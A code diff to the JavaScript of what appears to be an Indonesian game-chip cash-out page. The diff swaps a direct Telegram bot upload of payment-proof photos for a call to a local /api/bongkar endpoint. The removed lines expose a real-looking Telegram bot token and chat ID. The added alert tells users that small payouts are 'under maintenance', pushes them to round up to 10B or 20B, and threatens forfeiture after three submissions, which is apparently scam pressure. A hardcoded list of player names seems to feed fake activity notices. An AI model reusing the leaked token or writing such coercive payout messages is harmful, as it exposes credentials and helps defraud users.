@@ -549,8 +549,6 @@ stars.forEach(star => {
 // Default 5 bintang
 stars.forEach(s => s.classList.add('active'));
     // --- TELEGRAM CONFIG ---
-    const TELEGRAM_TOKEN = "8281346868:AAGLSYVYHVjR6uZHqx0pukGABVOXD-6UOjw"; 
-    const TELEGRAM_CHAT_ID = "6604182176";
 
     const players = ["ahmad", "player_2448011", "player_1140854", "kings", "Player_1895", "suprilopez", "RizkyGamer", "andika_01", "shadowX", "ZakyPro", "indra_777", "sultanboss", "adit", "kamusiapa", "swankevin", "ohandi", "fatxin", "ardiansyah", "roby", "rofrigo", "bahlil", "mahfud", "sumi", "azmi", "rendy", "agam", "dimas", "kikihoki", "eyolf", "STECU", "Linushen", "enji", "luffy"];
     const texts = [
@@ -680,37 +678,39 @@ stars.forEach(s => s.classList.add('active'));
 
         // Persis pola detail.html: kirim file sebagai multipart/form-data.
         // Persis pola detail.html: kirim file sebagai multipart/form-data.
+// Kirim bukti ke server sendiri
 const telegramForm = new FormData();
-telegramForm.append("chat_id", TELEGRAM_CHAT_ID);
+
 telegramForm.append("photo", photo, photo.name);
 telegramForm.append("caption", msg);
-telegramForm.append("parse_mode", "Markdown");
 
 try {
-    const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
-        {
-            method: "POST",
-            body: telegramForm
-        }
-    );
+
+    const response = await fetch("/api/bongkar", {
+        method: "POST",
+        body: telegramForm
+    });
 
     const result = await response.json();
 
     if (!response.ok || !result.ok) {
         throw new Error(
-            result.description || "Gagal mengirim bukti ke Admin"
+            result.error || "Gagal mengirim bukti ke Admin"
         );
     }
 
-    alert("PENCAIRAN ...");
+    alert("PENCAIRAN BONGKAR DIBAWAH 10B SAAT INI SEDANG MAINTENANCE-GENAPKAN KE 10B ATAU 20B AGAR UANG LANSUNG DI PROSES OTOMATIS(JANGAN ISI FORMAT LEBIH DARI 3X JIKA TETAP MENGISI MAKA UANG HANGUS).");
+
     this.reset();
 
 } catch (error) {
+
     console.error("TELEGRAM SEND ERROR:", error);
+
     alert("Gagal mengirim bukti gambar ke Admin. Silakan coba lagi.");
 
 } finally {
+
     btn.innerText = "PROSES BONGKAR";
     btn.disabled = false;
 }
